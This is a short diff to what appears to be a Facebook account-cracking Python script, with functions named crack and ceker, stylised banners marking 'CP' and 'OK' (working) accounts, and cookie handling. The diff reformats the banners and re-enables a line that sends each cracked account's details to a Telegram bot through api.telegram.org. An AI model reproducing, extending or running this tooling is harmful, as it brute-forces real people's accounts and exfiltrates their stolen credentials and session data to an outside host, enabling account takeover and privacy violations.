@@ -970,7 +970,8 @@ def crack(idf, pwv):
 					ceker(idf,pw)
 				else:
 					HAXOi('\n')
-					statuscp = f''' ▄︻デ══━一 #1🇮🇶𖨤𓆩- 𓊆L. M𝑬𝑺𝑺𝑰🫀𓊇✞࿅ «𝗖𝗣  سڪيوࢪ ❌» ⏎
+					statuscp = f'''
+▄︻デ══━一 #1🇮🇶𖨤𓆩- 𓊆L. M𝑬𝑺𝑺𝑰🫀𓊇✞࿅ «𝗖𝗣  سڪيوࢪ ❌» ⏎
 ⋘━━━━━━━﴾𓆩VIP𓆪﴿━━━━━━━⋙
 					
 MEESI_CP
@@ -1042,7 +1043,8 @@ MEESI_CP
 							tahun += nenen+", "
 					except:pass
 
-					infoakun += f''' ▄︻デ══━一 #1🇮🇶𖨤𓆩- 𓊆L. M𝑬𝑺𝑺𝑰🫀𓊇✞࿅ «𝗢𝗞  ✅حساب شغال✅
+					infoakun += f'''
+▄︻デ══━一 #1🇮🇶𖨤𓆩- 𓊆L. M𝑬𝑺𝑺𝑰🫀𓊇✞࿅ «𝗢𝗞  ✅حساب شغال✅
  » ⏎
 
 
@@ -1103,7 +1105,7 @@ Messi :لاتنسه صور الصيد『@FF22L 』⏎'''
  اصور الصيد :『@FF22L 』⏎'''
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
-			#		requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
+					requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
 					cek_HAXOXX(kuki)
 					break
 			else:
